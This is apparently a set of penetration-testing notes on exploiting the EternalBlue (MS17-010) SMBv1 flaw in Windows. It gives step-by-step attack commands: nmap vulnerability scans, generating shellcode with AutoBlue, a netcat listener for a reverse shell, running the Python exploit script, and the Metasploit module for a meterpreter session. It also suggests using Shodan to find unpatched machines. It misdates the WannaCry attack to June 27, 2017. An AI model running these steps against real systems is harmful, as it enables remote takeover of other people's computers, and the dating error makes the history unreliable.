# Exploiting SMB: Eternal Blue
> EternalBlue (MS17-010 & CVE-2017-0144) is the name given to a collection of Windows vulnerabilities and exploits that allow attackers to remotely execute arbitrary code and gain access to a Windows system and consequently to the network the target sits on.

## Contents
- [Intro & Info](#intro--info)
  - [MS17-010 ExternalBlue Exploit](#ms17-010-externalblue-exploit)
  - [MS17-010 ExternalBlue Exploit... More Info](#ms17-010-externalblue-exploit-more-info)
  - [MS17-010 EternalBlue: Patches and Such](#ms17-010-eternalblue-patches-and-such)
  - [Shodan Search](#shodan-search)
  - [Exploit Tool: AutoBlue-MS17-010](#exploit-tool-autoblue-ms17-010)
- [Exploit Methods](#exploit-methods)
  - [Manual](#manual)
  - [MetaSploit](#metasploit)

## Intro & Info

### MS17-010 ExternalBlue Exploit
- EternalBlue was developed by the NSA to take advantage of the MS17-010 vulnerability and was leaked to the public by a hacker group called The Shadow Brokers in 2017.
- The EternalBlue exploit takes advantage of a vulnerability in the Windows SMBv1 protocol that allows attackers to send specifically crafted packets that consequently facilitate the execution of arbitrary commands.
  - This could also be a reverse shell or meterpreter session in msfconsole.
  - And you get admin. So there's no priv esc to be had. You're in and you're in.
- One of the biggest MS Fubars of the last 10 to 15 years.

### MS17-010 ExternalBlue Exploit... More Info
- The EternalBlue exploit was used in the WannaCry ransomware attack on June 27, 2017, to exploit other Windows systems across networks with the objective of spreading the ransomware to as many systems as possible.
- This vulnerability affects multiple version of Windows:
  -   Windows Vista, 7, 8.1, Windows 10
  -   Windows Server 2008, 2012, 2016
 
### MS17-010 EternalBlue: Patches and Such
- Microsoft released a patch for the vulnerability in March of 2017. However many users and companies have still not yet patched their systems.
- The EternalBlue exploit has an MSF auxiliary module that can be used to check if a target system is vulnerable to the exploit, and it also has an exploit module that can be used to exploit the vulnerability on unpatched system.
- The EternalBlue exploit module can be used to exploit vulnerable Windows systems and consequently provide us with a priviliged meterpreter session on the target system.
- In addition to MSF modules, we can also manually exploit the vulnerability by utilizing publicly available exploit code.

### [Shodan Search](https://www.shodan.io/)
- You can do a Shodan search and find thousands of machines still running versions of Windows that are vulnerable (unpatched).

### Exploit Tool: [AutoBlue-MS17-010](https://github.com/3ndG4me/AutoBlue-MS17-010)
- Manual Exploitation: Through the use of a tool called AutoBlue-MS17-010

## Exploit Methods
```
nmap -p 445 -sV -sC -O [target ip]
nmap -p 445 -sV --script smb-vuln-ms17-010 [target ip]
```
- First run a standard port scan with nmap (`-sV -sC -O`); should confirm smb and the o/s, etc. 
- Then run an nmap script (`smb-vuln-ms17-010`) to get info about the MS17-010 vulnerability on the target.
  - This will tell you if it is vulnerable or not.

### Manual

#### 1. [Clone the Repo](https://github.com/3ndG4me/AutoBlue-MS17-010)
- Clone the repo on your local machine
- Follow the instructions on Github (install dependencies, etc.)
- Remember: You'll have to give files executable permissions to run them.


#### 2. Generate Shell Code
- `cd` into the shell code directory of your repo clone.
- run the bash script `shell_prep.sh`
- Answer "yes" to the msvenom question. Then plug in the arguments when prompted.
- Regular shell, stageless
- That's it.  Pay attention to the .bin file name it spits out (`sc_x86.bin` or `sc_x64.bin`)
  - Do ***not*** use the `sc_x86_msf.bin` or the `sc_x64_msf.bin` files.

#### 3. Set up a Listener
```
nc -nvlp 1234
````
- On your local (attack) machine (obviously).
- `-n`  No DNS lookups
- `-v`  Verbose output
- `-l`  Listen for an incoming call
- `-p`  Port number

#### 4. Execute the Python Exploit Script
```
python eternalblue_exploit7.py [target ip] /path/to/shellcode/to/execute.bin
```
- Execute the appropriate Python script for your target system.
- When you hit enter you should get a reverse shell on your netcat listener. 

### MetaSploit

- Start msfconsole and search for eternalblue
  -  There are two types of modules you can use
  -  Auxiliary: scans, etc. Tells you whether the target is vulnerable or not
  -  Exploit: This one runs the exploit on a vulnerable system
-  `use exploit/windows/smb/ms17_010_eternalblue`
-  Note the default payload. If it's okay, no changes necessary. If not, change it.
-  Check and set options: LHOST, LPORT, RHOSTS
-  `run`
-  You should get a meterpreter session quickly
